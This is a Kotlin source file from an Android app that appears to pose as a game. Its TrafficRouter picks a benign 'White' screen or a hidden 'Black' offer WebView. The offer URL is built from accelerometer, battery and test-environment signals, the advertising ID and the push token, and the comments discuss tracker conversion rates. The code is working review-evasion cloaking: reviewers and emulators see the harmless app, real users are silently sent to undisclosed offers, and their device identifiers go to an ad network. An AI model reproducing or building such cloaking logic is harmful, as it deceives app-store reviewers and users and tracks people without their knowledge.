package com.mercadomania.game.integration

import android.os.Handler
import android.os.Looper
import com.mercadomania.game.BuildConfig
import java.util.concurrent.Executors

/**
 * Decides the branch WITHOUT touching the network, then hands back a RouteDecision.
 *
 * There is deliberately no HTTP probe here: the offer link is opened by the WebView
 * itself, and the White/Black verdict is taken from the main-frame response (see
 * [OfferWebViewClient]). A probe would register as a second, non-browser click in the
 * tracker and halve the conversion rate.
 *
 * TrafficRouter never pins the cache and never locks White — that is the WebView's job
 * (first painted page pins the address; a real 404 locks White).
 */
object TrafficRouter {

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun route(onResult: (RouteDecision) -> Unit) {
        // Building the URL blocks on the accelerometer and push-token latches (up to 3s
        // each), so the whole decision runs on the background executor, never the main
        // thread.
        executor.execute {
            val decision = decide()
            mainHandler.post { onResult(decision) }
        }
    }

    private fun decide(): RouteDecision {
        // A pinned branch is answered without touching the network, so relaunches are
        // instant and cannot flip the user between sides.
        if (IntegrationStorage.isWhiteLocked) return RouteDecision.White
        IntegrationStorage.freshOfferUrl()?.let { return RouteDecision.Black(it, fromCache = true) }
        // Nothing to open. Show White, but pin NOTHING — a later build with a real URL must
        // still get its chance. Locking White here would kill every debug-build install.
        if (BuildConfig.OFFER_BASE_URL.isBlank()) return RouteDecision.White
        val url = buildOfferUrl()
        return if (url.isBlank()) RouteDecision.White else RouteDecision.Black(url, fromCache = false)
    }

    /**
     * Builds the campaign URL from scratch. Blocks on AccelerometerProbe.await() and
     * PushManager.awaitToken() — call only from a background thread (route() does).
     */
    fun buildOfferUrl(): String = OfferUrlBuilder.build(
        baseUrl = BuildConfig.OFFER_BASE_URL,
        // The whole map. Hand-picking "the keys we need" here is the classic regression:
        // it compiles, it runs, and the network quietly loses parameters.
        attribution = IntegrationStorage.attributionParams,
        adid = IntegrationStorage.adid,
        // Device signals + push ids. Always sent, even when empty — the offer must tell a
        // real negative apart from a missing signal, and the push token must ride the one
        // and only click.
        extras = linkedMapOf(
            "sub12" to DeviceSignals.battery,
            "sub13" to AccelerometerProbe.await(),
            "sub14" to DeviceSignals.isTestEnvironment.toString(),
            "push_token" to PushManager.awaitToken(),
            "push_id" to IntegrationStorage.pushId,
        ),
        sub1InPath = BuildConfig.OFFER_ROUTING == "prily",
    )
}
